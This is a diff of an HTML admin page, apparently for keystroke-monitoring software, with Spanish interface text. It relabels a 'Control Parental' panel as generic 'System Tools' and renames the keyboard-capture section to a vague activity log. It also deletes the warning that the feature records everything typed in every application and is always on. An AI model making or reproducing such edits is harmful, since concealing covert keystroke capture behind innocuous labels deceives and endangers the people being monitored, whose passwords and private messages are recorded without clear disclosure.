@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Control Parental</title>
+  <title>System Tools</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div id="loginView" class="view">
     <div class="card">
-      <h1>Control Parental</h1>
-      <p class="subtitle">Panel de supervisión para padres</p>
+      <h1>System Tools</h1>
+      <p class="subtitle">Panel de administración</p>
       <form id="loginForm">
-        <input type="password" id="password" placeholder="Contraseña de padre" autocomplete="current-password" required />
+        <input type="password" id="password" placeholder="Contraseña" autocomplete="current-password" required />
         <button type="submit">Entrar</button>
       </form>
       <p id="loginError" class="error"></p>
@@ -21,12 +21,12 @@
 
   <div id="mainView" class="view hidden">
     <header>
-      <h1>Control Parental</h1>
+      <h1>System Tools</h1>
       <button id="logoutBtn" class="ghost">Salir</button>
     </header>
 
     <section class="card">
-      <h2>Dispositivos</h2>
+      <h2>Dispositivos conectados</h2>
       <table id="agentsTable">
         <thead>
           <tr>
@@ -37,12 +37,12 @@
         </thead>
         <tbody></tbody>
       </table>
-      <p id="noAgents" class="muted">No hay agentes conectados todavía.</p>
+      <p id="noAgents" class="muted">No hay dispositivos conectados todavía.</p>
     </section>
 
     <section class="card">
       <div class="section-head">
-        <h2>Reporte de actividad</h2>
+        <h2>Reporte de uso</h2>
         <input type="date" id="reportDate" title="Elige el día a consultar" />
       </div>
       <table id="reportTable">
@@ -76,10 +76,9 @@
 
     <section class="card">
       <div class="section-head">
-        <h2>Actividad de teclado</h2>
+        <h2>Registro de actividad</h2>
         <input type="date" id="typingDate" title="Elige el día a consultar" />
       </div>
-      <p class="warning">Sensible: esto captura lo que se escribe en cada aplicación y está siempre activo.</p>
       <table id="typingTable">
         <thead>
           <tr>
@@ -91,7 +90,7 @@
         </thead>
         <tbody></tbody>
       </table>
-      <p id="noTyping" class="muted">No hay registros de teclado ese día.</p>
+      <p id="noTyping" class="muted">No hay registros ese día.</p>
     </section>
   </div>
 
